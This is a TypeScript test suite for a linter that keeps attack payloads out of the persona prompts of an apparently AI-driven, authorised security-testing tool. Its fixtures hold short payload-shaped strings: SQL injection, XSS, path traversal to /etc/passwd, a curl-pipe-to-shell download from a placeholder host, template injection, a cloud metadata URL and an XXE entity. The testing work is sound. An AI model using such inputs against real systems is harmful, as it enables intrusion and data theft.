import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';

import { describe, expect, it } from 'vitest';

import {
  DENYLIST_FILE,
  PROMPTS_DIR_FILE,
  collectPromptSources,
  lintPromptSources,
  parseDenylist,
  type Denylist,
  type PromptSource,
} from './prompt-lint.js';

const REAL_DENYLIST_TEXT = readFileSync(new URL('../lint/denylist.json', import.meta.url), 'utf8');
const REAL_DENYLIST = parseDenylist(REAL_DENYLIST_TEXT);
/** The fixtures test the rules, so they run without the repo's allowlist (checked separately). */
const RULES_ONLY: Denylist = { ...REAL_DENYLIST, allowlist: [] };

function src(dir: string, name: string, text: string): PromptSource {
  return { file: `${PROMPTS_DIR_FILE}/${dir}/${name}`, dir, name, text };
}

function frontMatter(persona: string, version = '1.0.0', status = 'released'): string {
  return `---\npersona: ${persona}\nversion: ${version}\nstatus: ${status}\nchangelog: |\n  initial\nauthoredBy: "team"\n---\n`;
}

const BASE_BODY = [
  '# Authorisation and safety preamble',
  '',
  'Authorised under standing authorisation `{saId}`, approved by `{approverIdentity}`.',
  '',
  '- Asset scope: `{assetScope}`',
  '- Test window: `{testWindow}`',
  '- Allowed intrusiveness (ceiling): `{maxIntrusiveness}`',
  '- Roles available to this run: `{roles}`',
  '',
].join('\n');

const BASE = src('_base', '1.0.0.md', `${frontMatter('_base')}${BASE_BODY}`);

const COMPLIANT_PERSONA_BODY = [
  '# Persona: planner',
  '',
  'Plan test cases. Cite CWE-89, WSTG-INPV-05, WSTG-INFO, OWASP A03, API08 and ASVS v5.0.0-V2.1.1.',
  'Refer to ASVS v5.0.0 as a standard version. Never write payloads.',
  '',
].join('\n');

const PLANNER = src('planner', '1.0.0.md', `${frontMatter('planner')}${COMPLIANT_PERSONA_BODY}`);

function rulesOf(sources: PromptSource[], denylist: Denylist = RULES_ONLY): string[] {
  return lintPromptSources(sources, denylist).diagnostics.map((d) => d.rule);
}

describe('prompt lint: compliant prompts', () => {
  it('passes a compliant base preamble and persona', () => {
    const result = lintPromptSources([BASE, PLANNER], RULES_ONLY);
    expect(result.diagnostics).toEqual([]);
    expect(result.checked).toBe(2);
  });

  it('passes the repository prompts under the reviewed denylist', () => {
    const sources = collectPromptSources(fileURLToPath(new URL('../prompts', import.meta.url)));
    const result = lintPromptSources(sources, REAL_DENYLIST);
    expect(result.diagnostics).toEqual([]);
    expect(result.checked).toBeGreaterThanOrEqual(10);
  });
});

describe('prompt lint: forbidden content', () => {
  // Benign, minimal shapes that the denylist must flag. None is a working payload.
  it.each([
    ['sqli-tautology', `' or '1'='1`],
    ['sqli-union-select', '1 UNION SELECT password FROM users'],
    ['xss-script-element', '<script>alert(1)</script>'],
    ['path-traversal', '../../../../etc/passwd'],
    ['shell-download-execute', 'curl https://example.test/a | sh'],
    ['template-injection', '{{7*7}}'],
    ['raw-http-request', 'GET /admin HTTP/1.1'],
    ['cloud-metadata-endpoint', 'http://169.254.169.254/latest/meta-data'],
    ['prototype-pollution', 'obj.__proto__'],
    ['xml-external-entity', '<!ENTITY x SYSTEM "file:///x">'],
  ])('flags a payload-shaped %s line', (rule, payload) => {
    const bad = src('planner', '1.0.0.md', `${frontMatter('planner')}Plan.\n${payload}\n`);
    const result = lintPromptSources([BASE, bad], RULES_ONLY);
    const hit = result.diagnostics.find((d) => d.rule === rule);
    expect(hit, `expected ${rule}`).toBeDefined();
    expect(hit?.file).toBe(bad.file);
    expect(hit?.line).toBe(10);
  });

  it('never echoes the matched payload text in the message', () => {
    const payload = 'obj.__proto__';
    const bad = src('planner', '1.0.0.md', `${frontMatter('planner')}${payload}\n`);
    const hit = lintPromptSources([BASE, bad], RULES_ONLY).diagnostics.find(
      (d) => d.rule === 'prototype-pollution',
    );
    expect(hit?.message).not.toContain(payload);
    expect(hit?.message).toContain('prototype pollution');
  });

  it('still flags payloads in a file whose front-matter is broken (fail closed)', () => {
    const bad = src('planner', '1.0.0.md', `no front matter here\n<script>x</script>\n`);
    const rules = rulesOf([BASE, bad]);
    expect(rules).toContain('front-matter');
    expect(rules).toContain('xss-script-element');
  });

  it('does not flag preamble prose that names exploit payloads as a topic', () => {
    const prose = src(
      'planner',
      '1.0.0.md',
      `${frontMatter('planner')}Do not author exploit payloads, weaponised code or step-by-step attack walkthroughs.\n`,
    );
    expect(rulesOf([BASE, prose])).toEqual([]);
  });
});

describe('prompt lint: standard identifiers', () => {
  it.each([
    'CWE-0',
    'CWE-',
    'CWE-abc',
    'CWE-###',
    'WSTG-info-01',
    'WSTG-INFO-1',
    'WSTG-',
    'A00',
    'A11',
    'API11',
    'API0x',
    'ASVS v4.0.3-V1',
    'ASVS 5.0.0',
    'ASVS v5.0.0-*',
  ])('flags the malformed identifier %s', (token) => {
    const bad = src('planner', '1.0.0.md', `${frontMatter('planner')}Cite ${token} here.\n`);
    const hit = lintPromptSources([BASE, bad], RULES_ONLY).diagnostics.find(
      (d) => d.rule === 'standard-id',
    );
    expect(hit, `expected ${token} to be flagged`).toBeDefined();
    expect(hit?.line).toBe(9);
  });

  it('accepts the well-formed identifiers the prompts use', () => {
    const ok = src(
      'planner',
      '1.0.0.md',
      `${frontMatter('planner')}CWE-1024, WSTG-INFO, WSTG-ATHN-02, A01, A10, API01, API10, ASVS v5.0.0-V1.2.3.\n`,
    );
    expect(rulesOf([BASE, ok])).toEqual([]);
  });

  it('ignores bare standard names that are prose, not identifiers', () => {
    const prose = src(
      'planner',
      '1.0.0.md',
      `${frontMatter('planner')}OWASP, WSTG, CWE and ASVS.\n`,
    );
    expect(rulesOf([BASE, prose])).toEqual([]);
  });
});

describe('prompt lint: placeholders', () => {
  it('flags a placeholder in a persona body, which is never filled', () => {
    const bad = src('planner', '1.0.0.md', `${frontMatter('planner')}Scope: {saId}\n`);
    const hit = lintPromptSources([BASE, bad], RULES_ONLY).diagnostics.find(
      (d) => d.rule === 'placeholder',
    );
    expect(hit?.line).toBe(9);
    expect(hit?.message).toContain('{saId}');
  });

  it('flags an unknown placeholder in the base preamble', () => {
    const base = src('_base', '1.0.0.md', `${frontMatter('_base')}${BASE_BODY}Extra {bogus}.\n`);
    expect(rulesOf([base, PLANNER], RULES_ONLY)).toContain('placeholder');
  });

  it('flags a base preamble that lacks a required placeholder', () => {
    const base = src(
      '_base',
      '1.0.0.md',
      `${frontMatter('_base')}${BASE_BODY.replace('`{roles}`', 'none')}`,
    );
    const hit = lintPromptSources([base, PLANNER], RULES_ONLY).diagnostics.find(
      (d) => d.rule === 'placeholder',
    );
    expect(hit?.message).toContain('{roles}');
  });
});

describe('prompt lint: front-matter', () => {
  it('fails a new persona prompt that has no front-matter', () => {
    const bad = src('planner', '1.0.0.md', 'You are the planner.\n');
    const hit = lintPromptSources([BASE, bad], RULES_ONLY).diagnostics.find(
      (d) => d.rule === 'front-matter',
    );
    expect(hit).toMatchObject({ file: bad.file, line: 1 });
  });

  it('fails a persona whose front-matter names another persona than its directory', () => {
    const bad = src('planner', '1.0.0.md', `${frontMatter('osint')}Body.\n`);
    expect(rulesOf([BASE, bad], RULES_ONLY)).toContain('front-matter');
  });

  it('fails a version that does not match the file name', () => {
    const bad = src('planner', '1.0.0.md', `${frontMatter('planner', '1.0.1')}Body.\n`);
    expect(rulesOf([BASE, bad], RULES_ONLY)).toContain('front-matter');
  });

  it('fails a file name that is not <semver>.md', () => {
    const bad = src('planner', 'draft.md', `${frontMatter('planner')}Body.\n`);
    expect(rulesOf([BASE, bad], RULES_ONLY)).toContain('front-matter');
  });

  it('fails a directory that is not a known persona', () => {
    const bad = src('rogue-persona', '1.0.0.md', `${frontMatter('planner')}Body.\n`);
    expect(rulesOf([BASE, bad], RULES_ONLY)).toContain('front-matter');
  });
});

describe('prompt lint: base preamble composition', () => {
  it('fails every persona when no base preamble exists', () => {
    const rules = lintPromptSources([PLANNER], RULES_ONLY).diagnostics;
    expect(rules).toContainEqual(
      expect.objectContaining({ rule: 'base-preamble', file: PROMPTS_DIR_FILE }),
    );
  });

  it('reports a preamble that cannot be filled against the base file, once', () => {
    const base = src('_base', '1.0.0.md', `${frontMatter('_base')}${BASE_BODY}{unknown}\n`);
    const hits = lintPromptSources([base, PLANNER], RULES_ONLY).diagnostics.filter(
      (d) => d.rule === 'base-preamble',
    );
    expect(hits).toHaveLength(1);
    expect(hits[0]?.file).toBe(base.file);
    expect(hits[0]?.message).toContain('unknown placeholder');
  });
});

describe('prompt lint: allowlist', () => {
  const reporter = src(
    'reporter',
    '1.0.0.md',
    `${frontMatter('reporter')}Use \`CWE-###\` format.\n`,
  );

  it('excuses an exact match in the named file only', () => {
    const allow: Denylist = {
      ...REAL_DENYLIST,
      allowlist: [
        {
          rule: 'standard-id',
          file: reporter.file,
          token: 'CWE-###',
          reason: 'Format description, not a citation.',
        },
      ],
    };
    expect(rulesOf([BASE, reporter], allow)).toEqual([]);
  });

  it('does not excuse the same token in another file', () => {
    const allow: Denylist = {
      ...REAL_DENYLIST,
      allowlist: [
        {
          rule: 'standard-id',
          file: `${PROMPTS_DIR_FILE}/other/1.0.0.md`,
          token: 'CWE-###',
          reason: 'Scoped to another file.',
        },
      ],
    };
    expect(rulesOf([BASE, reporter], allow)).toContain('standard-id');
  });

  it('reports an allowlist entry that no longer matches, so the list cannot rot', () => {
    const allow: Denylist = {
      ...RULES_ONLY,
      allowlist: [
        {
          rule: 'standard-id',
          file: PLANNER.file,
          token: 'A11',
          reason: 'Was needed once.',
        },
      ],
    };
    const hit = lintPromptSources([BASE, PLANNER], allow).diagnostics.find(
      (d) => d.rule === 'allowlist',
    );
    expect(hit?.file).toBe(DENYLIST_FILE);
  });
});

describe('prompt lint: denylist validation', () => {
  const base = {
    rules: [{ id: 'demo-rule', description: 'demo', pattern: 'forbidden' }],
  };

  it('accepts a well-formed denylist and defaults flags to i', () => {
    const parsed = parseDenylist(JSON.stringify(base));
    expect(parsed.rules[0]?.flags).toBe('i');
    expect(parsed.allowlist).toEqual([]);
  });

  it.each([
    ['an invalid regular expression', { pattern: '([' }],
    ['a pattern that matches the empty string', { pattern: 'x*' }],
    ['unknown regex flags', { flags: 'z' }],
    ['a non-kebab-case id', { id: 'Bad_Id' }],
  ])('rejects %s', (_label, override) => {
    const bad = { rules: [{ ...base.rules[0], ...override }] };
    expect(() => parseDenylist(JSON.stringify(bad))).toThrow();
  });

  it('rejects duplicate rule ids', () => {
    const dup = { rules: [base.rules[0], base.rules[0]] };
    expect(() => parseDenylist(JSON.stringify(dup))).toThrow(/duplicate rule id/);
  });

  it('rejects an allowlist entry without a reason', () => {
    const bad = {
      ...base,
      allowlist: [{ rule: 'standard-id', file: PLANNER.file, token: 'A11' }],
    };
    expect(() => parseDenylist(JSON.stringify(bad))).toThrow();
  });

  it('rejects an empty rule set, so a broken list cannot pass silently', () => {
    expect(() => parseDenylist(JSON.stringify({ rules: [] }))).toThrow();
  });
});
